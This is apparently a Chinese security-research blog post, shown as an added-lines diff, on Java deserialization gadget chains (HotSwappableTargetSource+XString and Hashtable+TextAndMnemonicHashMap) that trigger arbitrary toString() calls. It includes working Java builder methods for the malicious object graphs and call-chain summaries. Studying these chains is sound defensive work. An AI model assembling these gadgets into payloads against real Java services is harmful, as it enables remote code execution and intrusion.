+<h1 id="HotSwappableTargetSource-xString触发toString"><a href="#HotSwappableTargetSource-xString触发toString" class="headerlink" title="HotSwappableTargetSource+xString触发toString"></a>HotSwappableTargetSource+xString触发toString</h1><p>其实在ROME原生链也说过：<a target="_blank" rel="noopener" href="http://localhost:4000/2025/11/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8E%9F%E7%94%9F%E9%93%BE/?highlight=xstring%E8%A7%A6%E5%8F%91#HotSwappableTargetSource-xString%E8%A7%A6%E5%8F%91toString">http://localhost:4000/2025/11/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8E%9F%E7%94%9F%E9%93%BE/?highlight=xstring%E8%A7%A6%E5%8F%91#HotSwappableTargetSource-xString%E8%A7%A6%E5%8F%91toString</a></p>
+<p>这是Spring原生的一条触发toString的链子，需要导入Spring的aop依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其实本质上和上面的HashMap+XString触发没区别，只不过中间多了HotSwappableTargetSource#equals的点</p>
+<h2 id="触发toString的工具方法-3"><a href="#触发toString的工具方法-3" class="headerlink" title="触发toString的工具方法"></a>触发toString的工具方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HashMap+HotSwappableTargetSource+xString触发toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">get_HashMap_HotSwappableTargetSource_xString</span><span class="params">(Object obj)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">xString</span> <span class="operator">=</span> Utils.createWithoutConstructor(Class.forName(<span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>));</span><br><span class="line">    Utils.setFieldValue(xString,<span class="string">&quot;m_obj&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(obj);</span><br><span class="line">    <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(xString);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    hashmap.put(hotSwappableTargetSource1,hotSwappableTargetSource1);</span><br><span class="line">    hashmap.put(hotSwappableTargetSource2,hotSwappableTargetSource2);</span><br><span class="line">    <span class="keyword">return</span> hashmap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也是一样，将需要触发toString的对象传入obj，并序列化和反序列化返回的hashmap</p>
+<h2 id="触发Gadget-2"><a href="#触发Gadget-2" class="headerlink" title="触发Gadget"></a>触发Gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject() -&gt; </span><br><span class="line">        HotSwappableTargetSource#equals() -&gt; </span><br><span class="line">            XString#equals() -&gt; </span><br><span class="line">                任意调#toString() </span><br></pre></td></tr></table></figure>
+
+<h1 id="hashtable-TextAndMnemonicHashMap触发toString"><a href="#hashtable-TextAndMnemonicHashMap触发toString" class="headerlink" title="hashtable+TextAndMnemonicHashMap触发toString"></a>hashtable+TextAndMnemonicHashMap触发toString</h1><p>这个倒是第一次见，分析一下</p>
+<h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>先看到hashtable#readObject()</p>
+<h3 id="hashtable-readObject"><a href="#hashtable-readObject" class="headerlink" title="hashtable#readObject()"></a>hashtable#readObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.io.Serial</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    readHashtable(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">readHashtable</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read and validate loadFactor (ignore threshold - it will be re-computed)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line">    lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Validate # of elements</span></span><br><span class="line">    <span class="keyword">if</span> (elements &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Illegal # of Elements: &quot;</span> + elements);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Clamp original length to be more than elements / loadFactor</span></span><br><span class="line">    <span class="comment">// (this is the invariant enforced with auto-growth)</span></span><br><span class="line">    origlength = Math.max(origlength, (<span class="type">int</span>)(elements / lf) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Compute new length with a bit of room 5% + 3 to grow but</span></span><br><span class="line">    <span class="comment">// no larger than the clamped original length.  Make the length</span></span><br><span class="line">    <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">    <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)((elements + elements / <span class="number">20</span>) / lf) + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">        length--;</span><br><span class="line">    length = Math.min(length, origlength);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (length &lt; <span class="number">0</span>) &#123; <span class="comment">// overflow</span></span><br><span class="line">        length = origlength;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">    <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">    SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, length);</span><br><span class="line">    Hashtable.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line">    table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">    threshold = (<span class="type">int</span>)Math.min(length * lf, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会创建一个桶哈希数组，并遍历elements序列化时写入的 entry 数量调用reconstitutionPut放入哈希表，进入reconstitutionPut函数</p>
+<h3 id="hashtable-reconstitutionPut"><a href="#hashtable-reconstitutionPut" class="headerlink" title="hashtable#reconstitutionPut()"></a>hashtable#reconstitutionPut()</h3><p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202230629851.png" alt="image-20260202230629851"></p>
+<p>和HashMap的putval一样，链子是调用到AbstractMap.equals</p>
+<h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap#equals()"></a>AbstractMap#equals()</h3><p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202231442579.png" alt="image-20260202231442579"></p>
+<p>设置m为一个TextAndMnemonicHashMap，这样就能调用到TextAndMnemonicHashMap的get方法</p>
+<h3 id="TextAndMnemonicHashMap-get"><a href="#TextAndMnemonicHashMap-get" class="headerlink" title="TextAndMnemonicHashMap#get()"></a>TextAndMnemonicHashMap#get()</h3><p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202231727675.png" alt="image-20260202231727675"></p>
+<p>key是可控的，由此能触发任意toString了</p>
+<h3 id="触发toString的工具方法-4"><a href="#触发toString的工具方法-4" class="headerlink" title="触发toString的工具方法"></a>触发toString的工具方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hashtable+TextAndMnemonicHashMap触发toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">get_Hashtable_TextAndMnemonicHashMap</span><span class="params">(Object obj)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Map</span> <span class="variable">tHashMap1</span> <span class="operator">=</span> (HashMap) Utils.createWithoutConstructor(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">    <span class="type">Map</span> <span class="variable">tHashMap2</span> <span class="operator">=</span> (HashMap) Utils.createWithoutConstructor(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">    tHashMap1.put(obj,<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">    tHashMap2.put(obj,<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line">    Utils.setFieldValue(tHashMap1,<span class="string">&quot;loadFactor&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    Utils.setFieldValue(tHashMap2,<span class="string">&quot;loadFactor&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(tHashMap1,<span class="number">1</span>);</span><br><span class="line">    hashtable.put(tHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    tHashMap1.put(obj, <span class="literal">null</span>);</span><br><span class="line">    tHashMap2.put(obj, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> hashtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用法是一样的</p>
+<h3 id="触发Gadget-3"><a href="#触发Gadget-3" class="headerlink" title="触发Gadget"></a>触发Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashtable#readObject()-&gt;</span><br><span class="line">    hashtable#reconstitutionPut()-&gt;</span><br><span class="line">        AbstractMap#equals()-&gt;</span><br><span class="line">            TextAndMnemonicHashMap#get()-&gt;</span><br><span class="line">                obj#toString()</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2026/02/02/%E9%AB%98%E7%89%88%E6%9C%AC%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/" title="高版本触发toString的几种方法">https://wanth3f1ag.top/2026/02/02/高版本触发toString的几种方法/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/javasec/" rel="tag"># javasec</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/01/Java%E4%B9%8BJDK17%E5%BC%BA%E5%B0%81%E8%A3%85-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8/" rel="prev" title="JDK17强封装&amp;高版本JDK反射调用">
+                  <i class="fa fa-angle-left"></i> JDK17强封装&高版本JDK反射调用
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.4m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">51:56</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
